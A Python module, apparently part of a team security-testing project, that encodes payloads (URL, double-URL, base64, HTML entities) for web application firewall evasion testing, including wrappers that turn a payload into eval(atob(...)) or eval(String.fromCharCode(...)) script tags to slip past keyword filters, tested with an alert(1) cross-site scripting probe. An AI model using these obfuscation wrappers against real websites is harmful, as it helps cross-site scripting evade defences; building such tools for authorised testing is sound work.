# encoders.py - Member 2 
# this handles payload encoding and obfuscation techniques for WAF evasion testing.

import base64
import html
import urllib.parse


# URL Encoding Techniques
def encode_url_standard(payload: str) -> str:
    # Standard percent-encoding (safe='' encodes all characters including / and :)
    return urllib.parse.quote(payload, safe='')

def encode_url_double(payload: str) -> str:
    # Double encoding: encodes the '%' itself into '%25' on the second pass
    # Example: '<' -> '%3C' -> '%253C'
    first_pass = urllib.parse.quote(payload, safe='')
    return urllib.parse.quote(first_pass, safe='')


#Base64 Encoding Techniques 
def encode_base64_standard(payload: str) -> str:
    # Converts string to bytes, encodes to base64, then returns decoded string
    payload_bytes = payload.encode('utf-8')
    encoded_bytes = base64.b64encode(payload_bytes)
    return encoded_bytes.decode('utf-8')

def encode_base64_executable(payload: str) -> str:
    # Wraps base64 inside eval(atob()) so it can execute in a browser DOM context
    b64_str = encode_base64_standard(payload)
    return f"<script>eval(atob('{b64_str}'))</script>"


# HTML Entity Encoding Techniques
def encode_html_named(payload: str) -> str:
    # Standard HTML named entities (< becomes &lt;)
    return html.escape(payload)

def encode_html_decimal(payload: str) -> str:
    # Converts each character to its ASCII decimal entity (e.g., < becomes &#60;)
    return "".join(f"&#{ord(c)};" for c in payload)

def encode_html_hex(payload: str) -> str:
    # Converts each character to hex entity format (e.g., < becomes &#x3c;)
    # [2:] removes the '0x' prefix from hex()
    return "".join(f"&#x{hex(ord(c))[2:]};" for c in payload)


# Obfuscation Techniques
def encode_js_charcode(payload: str) -> str:
    # Converts string to comma-separated ASCII codes inside String.fromCharCode()
    # Bypasses filters blocking quotes or keywords like alert and script
    char_codes = ",".join(str(ord(c)) for c in payload)
    return f"<script>eval(String.fromCharCode({char_codes}))</script>"


# Main Dictionary Function for Member 1 & 4 
def generate_all_encodings(payload: str) -> dict:
    # Bundles all encoded versions into a dictionary for main.py and storage.py
    return {
        "Original": payload,
        "URL Standard": encode_url_standard(payload),
        "URL Double": encode_url_double(payload),
        "Base64 Standard": encode_base64_standard(payload),
        "Base64 Executable": encode_base64_executable(payload),
        "HTML Named": encode_html_named(payload),
        "HTML Decimal": encode_html_decimal(payload),
        "HTML Hex": encode_html_hex(payload),
        "JS CharCode": encode_js_charcode(payload)
    }


# Standalone test block to verify Member 2's module independently
if __name__ == "__main__":
    test_payload = "<script>alert(1)</script>"
    print(f"Testing encoders.py with: {test_payload}\n")
    
    results = generate_all_encodings(test_payload)
    for name, value in results.items():
        print(f"[{name}] -> {value}")
